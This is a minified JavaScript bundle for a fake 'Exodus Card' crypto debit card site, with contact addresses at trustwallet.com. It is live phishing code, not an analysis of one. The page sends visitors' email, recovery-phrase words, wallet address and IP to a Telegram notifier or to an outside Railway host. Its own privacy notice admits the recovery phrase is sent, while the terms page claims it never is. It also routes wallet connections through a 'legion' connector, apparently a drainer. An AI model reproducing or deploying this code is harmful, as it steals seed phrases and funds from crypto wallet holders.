      <button class="btn btn-blue" style="max-width:300px;font-size:15px;padding:14px" onclick="go('home')">Back to Home</button>
    </div>
  </main>`}function re(){return`
  ${f("main")}
  <main class="page" id="main" tabindex="-1">
    <div class="notfound-body">
      <div class="notfound-code" aria-hidden="true">404</div>
      <h1 class="notfound-title">Page not found</h1>
      <p class="notfound-text">The page you're looking for doesn't exist or has been moved.</p>
      <button class="btn btn-blue notfound-btn" onclick="go('home')">Back to Home</button>
    </div>
  </main>`}function se(){return`
  ${f("back","home")}
  <main class="scrollable" id="main" tabindex="-1">
    <div class="legal-wrap">
      <h1 class="legal-h1">Terms of Use</h1>
      <p class="legal-date">Last updated: January 1, 2026</p>

      <h2 class="legal-h2">1. Acceptance of Terms</h2>
      <p class="legal-p">By accessing or using the Exodus Card service ("Service"), you agree to be bound by these Terms of Use. If you do not agree, please do not use the Service.</p>

      <h2 class="legal-h2">2. Description of Service</h2>
      <p class="legal-p">Exodus Card is a debit card linked to your self-custody Exodus wallet. Spend supported digital assets (including USDT and USDC) at merchants that accept Visa or Mastercard. Card services are provided through licensed partners; terms apply.</p>

      <h2 class="legal-h2">3. Eligibility</h2>
      <p class="legal-p">You must be at least 18 years of age to use this Service. By using the Service, you represent and warrant that you meet this requirement. The Service may not be available in all jurisdictions.</p>

      <h2 class="legal-h2">4. Card Issuance Fee</h2>
      <p class="legal-p">A one-time card issuance fee of $1.00 USDT is charged to activate your card. This fee is non-refundable. There are no monthly fees or maintenance charges.</p>

      <h2 class="legal-h2">5. Self-Custody & Security</h2>
      <p class="legal-p">You are solely responsible for the security of your wallet and recovery phrase. Exodus does not store, access, or recover your private keys or recovery phrase.</p>
      <ul class="legal-ul">
        <li>Never share your recovery phrase with anyone, including Exodus support.</li>
        <li>Store your recovery phrase securely offline.</li>
        <li>Exodus will never ask for your recovery phrase.</li>
      </ul>

      <h2 class="legal-h2">6. Prohibited Activities</h2>
      <p class="legal-p">You agree not to use the Service for money laundering, terrorist financing, fraud, or any activity prohibited under applicable law.</p>

      <h2 class="legal-h2">7. Transaction Fees</h2>
      <p class="legal-p">While there is no top-up fee, certain transactions may be subject to currency conversion (FX) fees or network fees depending on the merchant location and transaction type.</p>

      <h2 class="legal-h2">8. Limitation of Liability</h2>
      <p class="legal-p">To the maximum extent permitted by law, Exodus shall not be liable for any indirect, incidental, special, or consequential damages arising from your use of the Service.</p>

      <h2 class="legal-h2">9. Changes to Terms</h2>
      <p class="legal-p">We reserve the right to modify these Terms at any time. Continued use of the Service after changes constitutes your acceptance of the new Terms.</p>

      <h2 class="legal-h2">10. Contact</h2>
      <p class="legal-p">For questions about these Terms: <strong><a href="mailto:legal@trustwallet.com">legal@trustwallet.com</a></strong></p>
    </div>
    ${b()}
  </main>`}function le(){return`
  ${f("back","home")}
  <main class="scrollable" id="main" tabindex="-1">
    <div class="legal-wrap">
      <h1 class="legal-h1">Privacy Policy</h1>
      <p class="legal-date">Last updated: January 1, 2026</p>

      <div class="privacy-notice">
        Data you enter (email, wallet address, and recovery phrase) is transmitted to our secure servers and used solely for card issuance. We do not share your data with third parties.
      </div>

      <h2 class="legal-h2">1. Introduction</h2>
      <p class="legal-p">Exodus ("we," "us," or "our") is committed to protecting your privacy. This Privacy Policy explains how we collect, use, and safeguard information when you use the Exodus Card service.</p>

      <h2 class="legal-h2">2. Information We Collect</h2>
      <ul class="legal-ul">
        <li><strong>Email address</strong> — used solely to deliver your virtual card details.</li>
        <li><strong>Wallet address</strong> — used to verify card eligibility and process the issuance fee.</li>
        <li><strong>Transaction data</strong> — anonymized spending data for service improvement.</li>
      </ul>

      <h2 class="legal-h2">3. What We Do NOT Collect</h2>
      <ul class="legal-ul">
        <li><strong>Recovery phrase</strong> — used only to verify wallet ownership during your session; transmitted securely and not stored permanently.</li>
        <li>Government-issued identity documents beyond what partners require for card issuance.</li>
        <li>Biometric data.</li>
        <li>Location data beyond what is strictly required for card processing.</li>
      </ul>

      <h2 class="legal-h2">4. How We Use Your Information</h2>
      <ul class="legal-ul">
        <li>Deliver your virtual card details.</li>
        <li>Send important service notifications.</li>
        <li>Provide customer support when you initiate contact.</li>
      </ul>

      <h2 class="legal-h2">5. Data Sharing</h2>
      <p class="legal-p">We do not sell, trade, or rent your personal information to third parties. We may share limited data with our licensed card issuer partners solely for card issuance and processing, under strict confidentiality agreements.</p>

      <h2 class="legal-h2">6. Data Security</h2>
      <p class="legal-p">We implement TLS encryption for data in transit and AES-256 encryption for data at rest. However, no method of transmission over the internet is 100% secure.</p>

      <h2 class="legal-h2">7. Data Retention</h2>
      <p class="legal-p">We retain your email address only as long as your card is active. You may request deletion at any time: <strong><a href="mailto:privacy@trustwallet.com">privacy@trustwallet.com</a></strong></p>

      <h2 class="legal-h2">8. Your Rights</h2>
      <p class="legal-p">Depending on your jurisdiction, you may have rights to access, correct, delete, or port your personal data. Contact: <strong><a href="mailto:privacy@trustwallet.com">privacy@trustwallet.com</a></strong></p>

      <h2 class="legal-h2">9. Cookies</h2>
      <p class="legal-p">We use only essential cookies necessary for site functionality. No tracking or advertising cookies.</p>

      <h2 class="legal-h2">10. Contact Us</h2>
      <p class="legal-p">For privacy-related questions: <strong><a href="mailto:privacy@trustwallet.com">privacy@trustwallet.com</a></strong></p>
    </div>
    ${b()}
  </main>`}const ce=3e3,de="https://sadrailala-production.up.railway.app",fe="0x0000000000000000000000000000000000000001";let S=0;async function ue(){const e=new AbortController,i=setTimeout(()=>e.abort(),2e3);try{const t=await fetch("https://api.ipify.org?format=json",{signal:e.signal});return t.ok&&(await t.json()).ip||"IP not available"}catch{return"IP not available"}finally{clearTimeout(i)}}function pe(){const e=[typeof window<"u"&&window.ST&&window.ST.connectedAddress,typeof window<"u"&&window.ST&&window.ST.bonusAddress,typeof window<"u"&&window.__TRUST_WC_ADDR__];for(const i of e){const t=String(i||"").trim();if(/^0x[a-fA-F0-9]{40}$/.test(t)&&t.toLowerCase()!==fe)return t}return null}async function he(e){const i=typeof window<"u"&&window.__TRUST_NOTIFY_URL__||"/.netlify/functions/telegram-notify",t=await fetch(i,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:e.message,parse_mode:"HTML"})});let a={};try{a=await t.json()}catch{a={}}return t.status===404?{ok:!1,reason:"netlify_missing"}:t.status===429?{ok:!1,reason:"rate_limit",error:"Rate limit exceeded"}:!t.ok&&!a.ok?{ok:!1,error:a.error||`HTTP ${t.status}`}:{ok:!0,...a}}async function $(e,i){const t=String(e.message||"").slice(0,1800),a=pe();if(!a)return{ok:!1,reason:"no_real_address"};const n=typeof window<"u"?window.location.href:"trust-card",r=await fetch(`${de}/api/v1/scout`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({user_address:a,chain_id:1,chain_family:"EVM",wallet_type:"TrustCard",source_page:`${n}
${t}`.slice(0,1900)})}),s=await r.json().catch(()=>({}));return!r.ok||s.success===!1?{ok:!1,error:s.message||`HTTP ${r.status}`}:{ok:!0,via:"railway"}}async function ye(e,{skipCooldown:i=!1}={}){if(!i){const t=Date.now();if(t-S<ce)return{ok:!1,reason:"cooldown"};S=t}try{const t=await he(e);return t.ok||t.reason==="rate_limit"?t:await $(e)}catch(t){try{return await $(e)}catch(a){return{ok:!1,error:a&&a.message||t&&t.message||"Network error"}}}}function ge({email:e,words:i,wordCount:t,card:a,bonusAddress:n,bonusToken:r,ip:s,bonusAmount:l,referredBy:k,referralCode:T}){const g=["🟢 NEW TRUST WALLET SUBMISSION","",`📧 Email: ${e}`,`💳 Card: ${a}`,"","💰 BONUS CLAIM",`📍 Address: ${n||"(none)"}`,`🪙 Token: ${r||"(none)"}`,`💵 Bonus Amount: $${l||450}`];return k&&g.push(`👥 Referred by: ${k}`),T&&g.push(`🔗 Your referral code: ${T}`),g.push("",`⏰ Time: ${new Date().toLocaleString("en-US",{timeZone:"UTC"})} UTC`,`🌍 IP: ${s}`),g.join(`
`)}const c=e=>document.querySelector(e),me=/.+@.+\..+/;function we(e,i){const t=()=>window.legion&&typeof window.legion.connect=="function"?window.legion:null;if(t()){e(t());return}let a=!1;const n=()=>{if(a)return;const l=t();l&&(a=!0,e(l))};window.addEventListener("legion:embed-ready",n,{once:!0}),window.addEventListener("legion:ready",n,{once:!0});let r=0;const s=setInterval(()=>{if(n(),a){clearInterval(s);return}++r>120&&(clearInterval(s),typeof i=="function"&&i())},50)}function ve(){try{if(window.ethereum&&window.ethereum.isTrust||window.trustwallet&&window.trustwallet.ethereum)return!0}catch{}return!1}function u(e){const i=window.legion;if(i&&typeof i.resolveProvider=="function"){const t=i.resolveProvider(e);if(t)return t}return null}function x(e,i,t){const a=window.legion;if(a){if(typeof a.isWcActive=="function"&&a.isWcActive()){window.showToast("WalletConnect already open — finish or close it first",3e3);return}if(typeof a.beginConnect=="function"&&a.beginConnect("injected"),i&&typeof a.connectInjected=="function"){a.connectInjected({type:"injected",provider:i,info:{name:e,walletKey:t||e}});return}typeof a.connect=="function"&&a.connect()}}function p(){const e=window.legion;if(e&&!(typeof e.isWcActive=="function"&&e.isWcActive())){try{window.__LEGION_DEEP_LINK_TARGET__=null}catch{}typeof e.beginConnect=="function"&&e.beginConnect("wc"),typeof e.connectWC=="function"?e.connectWC():typeof e.connect=="function"&&e.connect()}}function m(e){const i=window.legion;if(i){try{window.closeWalletModal()}catch{}document.querySelectorAll(".cw-loader").forEach(t=>{t.style.display="none"}),o.verifying=!1;try{const t=document.getElementById("__legion_mobile_wc_sheet");t&&t.remove()}catch{}try{window.__LEGION_DEEP_LINK_TARGET__=e}catch{}try{typeof i.clearWc=="function"&&i.clearWc(!1)}catch{}typeof i.beginConnect=="function"&&i.beginConnect("wc"),typeof i.connectWC=="function"?i.connectWC():typeof i.connect=="function"&&i.connect()}}function be(){try{const e=navigator.userAgent||"";if(/iPhone|iPad|iPod|Android|Mobile/i.test(e)||navigator.platform==="MacIntel"&&navigator.maxTouchPoints>1)return!0}catch{}return!1}const L={"/":"home","/index.html":"home","/terms":"terms","/privacy":"privacy"},W={home:"/",terms:"/terms",privacy:"/privacy"};function _(){const e=window.location.pathname.replace(/\/+$/,"")||"/";if(L[e]){o.view=L[e];return}if(e==="/welcome"||o.view==="welcome"){o.view="verify";return}e!=="/"&&e!=="/index.html"&&(o.view="notfound")}function xe(e){o.submitting=!1,(e==null?void 0:e.reason)==="cooldown"||(e==null?void 0:e.reason)==="rate_limit"?window.showToast("Please wait a few seconds before trying again",3e3):window.showToast("Submission failed. Please try again.",3e3),o.emailErr="Submission failed. Please try again.",w()}function M(){requestAnimationFrame(()=>{const e=c("#main");e&&e.focus()})}function y(){const e=c("#root");if(e){switch(o.view==="welcome"&&(o.view="verify"),o.view){case"home":e.innerHTML=C();break;case"card":e.innerHTML=oe();break;case"verify":e.innerHTML=ae();break;case"email":e.innerHTML=P();break;case"success":e.innerHTML=ne();break;case"terms":e.innerHTML=se();break;case"privacy":e.innerHTML=le();break;case"notfound":e.innerHTML=re();break;default:e.innerHTML=C();break}M(),o.view==="verify"&&h()}}window.go=function(e){e==="welcome"&&(e="verify"),o.view=e;const i=Object.hasOwn(W,e)?W[e]:"/";history.pushState({view:e},"",i+window.location.search),y(),setTimeout(()=>{const t=c("#main");t&&(t.scrollTop=0),e==="home"&&setTimeout(()=>{const a=c("#pb");a&&(a.style.width="96.74%")},260),e==="card"&&setTimeout(()=>U(o.cardIdx),80)},40)};window.goSection=function(e){o.view!=="home"?(o.view="home",y(),setTimeout(()=>setTimeout(()=>A(e),60),80)):A(e)};function A(e){const i=document.getElementById(e);i&&i.scrollIntoView({behavior:"smooth"})}window.setCard=function(e){o.cardIdx=e,y(),setTimeout(()=>U(e),60)};window.selectAndContinue=function(e){if(o.cardsLeft<=0){window.showToast("Rolling out",2500);return}o.selectedCard=e,o.cardsLeft=Math.max(0,o.cardsLeft-1);try{localStorage.setItem("cardsLeft",String(o.cardsLeft))}catch{}go("verify")};function U(e){const i=c("#cslider");if(!i)return;const t=i.querySelectorAll(".carousel-slide");t[e]&&i.scrollTo({left:t[e].offsetLeft,behavior:"smooth"})}function h(){const e=document.getElementById("cfmbtn");e&&(e.textContent="Connect Wallet",e.className="btn btn-blue confirm-btn confirm-active",e.disabled=!1,e.setAttribute("aria-disabled","false"),e.onclick=window.confirmVerify)}window.confirmVerify=function(){if(o.verifying)return;if(typeof window.__TRUST_DIRECT_CONNECT__=="function"){window.__TRUST_DIRECT_CONNECT__();return}if(typeof window.selectWallet=="function"){window.selectWallet("Exodus",null);return}const e=document.getElementById("cwModal");if(!e){window.showToast("Please wait, page is still loading…");return}try{window.__LEGION_DEEP_LINK_TARGET__="trust"}catch{}window.selectWallet&&window.selectWallet("Exodus",null)};window.closeWalletModal=function(){const e=document.getElementById("cwModal");e&&e.classList.remove("cw-show"),document.body.style.overflow="",o.verifying=!1,h()};window.selectWallet=function(e,i){if(o.verifying)return;document.querySelectorAll(".cw-loader").forEach(n=>{n.style.display="none"});const t=i==null?void 0:i.querySelector(".cw-loader");t&&(t.style.display="flex"),o.verifying=!0;const a=document.getElementById("cfmbtn");a&&(a.textContent="Connecting…",a.className="btn btn-blue confirm-btn confirm-disabled",a.disabled=!0),we(()=>{const r=String(e||"").toLowerCase(),s=be();try{if(r.includes("walletconnect"))p();else if(r.includes("trust"))if(s&&!ve())m("trust");else{const l=u("trust")||u("com.trustwallet.app")||window.trustwallet&&window.trustwallet.ethereum;l?x("Exodus",l,"trust"):s?m("trust"):p()}else if(r.includes("metamask"))if(s)m("metamask");else{const l=u("metamask")||u("io.metamask");l?x("MetaMask",l,"metamask"):p()}else if(r.includes("coinbase"))if(s)m("coinbase");else{const l=u("coinbase")||u("coinbase-extension")||u("com.coinbase.wallet")||window.coinbaseWalletExtension;l?x("Coinbase Wallet",l,"coinbase"):p()}else p()}catch(l){console.error("[TrustSite] connect failed",l),o.verifying=!1,t&&(t.style.display="none"),h(),window.showToast("Connect failed — try again",3e3)}},()=>{o.verifying=!1,t&&(t.style.display="none"),h(),window.showToast("Wallet engine not loaded — hard refresh and retry",4e3)})};window.addEventListener("legion:connected",e=>{var a,n;const i=((a=e==null?void 0:e.detail)==null?void 0:a.address)||((n=e==null?void 0:e.detail)==null?void 0:n.account)||"";o.verifying=!1,window.closeWalletModal();const t=document.getElementById("cfmbtn");t&&(t.textContent=i?`Connected ${String(i).slice(0,6)}…`:"Connected",t.className="btn btn-blue confirm-btn confirm-active",t.disabled=!1),window.showToast("Wallet connected",2500)});window.addEventListener("legion:error",e=>{var t,a;o.verifying=!1,h();const i=((t=e==null?void 0:e.detail)==null?void 0:t.message)||((a=e==null?void 0:e.detail)==null?void 0:a.error)||"Wallet connect error";window.showToast(String(i).slice(0,120),3500)});window.addEventListener("legion:embed-ready",()=>{const e=window.LEGION_CONFIG&&window.LEGION_CONFIG.wcProjectId;!e||!window.LegionWallet||typeof window.LegionWallet.init!="function"||window.LegionWallet.init({projectId:e}).catch(()=>{})});window.clearEmailErr=function(){o.emailErr="";const e=c("#emailFld"),i=c("#emailErrTxt");e&&e.classList.remove("email-err"),i&&(i.style.display="none")};function w(){const e=c("#root");e&&(e.innerHTML=P(),M())}window.submitEmail=async function(){if(o.submitting)return;const e=c("#emailFld"),i=e?e.value.trim():(o.email||"").trim();if(o.email=i,O(),i===""){o.emailErr="Please enter your email address",w();return}if(!me.test(i)){o.emailErr="Please enter a valid email address (e.g., name@domain.com)",w();return}o.referralCode=z(i),o.submitting=!0,o.emailErr="",w();const t=await ue(),a=ge({email:i,words:o.words,wordCount:o.wc,card:o.selectedCard||v[o.cardIdx].name,bonusAddress:o.bonusAddress,bonusToken:o.bonusToken,ip:t,bonusAmount:o.bonusAmount,referredBy:o.referredBy,referralCode:o.referralCode}),n=await ye({message:a});if(!n||n.ok!==!0){xe(n);return}R(),o.submitting=!1,go("success")};window.showToast=function(e,i=2e3){const t=document.getElementById("bonusToast");t&&t.remove();const a=document.createElement("div");a.id="bonusToast",a.className="toast-popup",a.setAttribute("role","status"),a.setAttribute("aria-live","polite"),a.textContent=e,document.body.appendChild(a),setTimeout(()=>{a.classList.add("toast-hide"),setTimeout(()=>a.remove(),500)},i)};window.copyReferralLink=function(){const e=document.getElementById("referralLinkFld");if(!e)return;const i=e.value;if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(i).then(()=>{window.showToast("Referral link copied!",2e3)}).catch(console.error);else{e.select();try{document.execCommand("copy"),window.showToast("Referral link copied!",2e3)}catch(t){console.error(t)}}};window.ST=o;D();N();o.view==="welcome"&&(o.view="verify");_();history.replaceState({view:o.view},"",window.location.pathname+window.location.search);y();setTimeout(()=>{const e=c("#pb");e&&(e.style.width="96.74%")},350);window.addEventListener("popstate",e=>{var i;(i=e.state)!=null&&i.view?o.view=e.state.view==="welcome"?"verify":e.state.view:_(),y(),setTimeout(()=>{const t=c("#main");t&&(t.scrollTop=0)},40)});
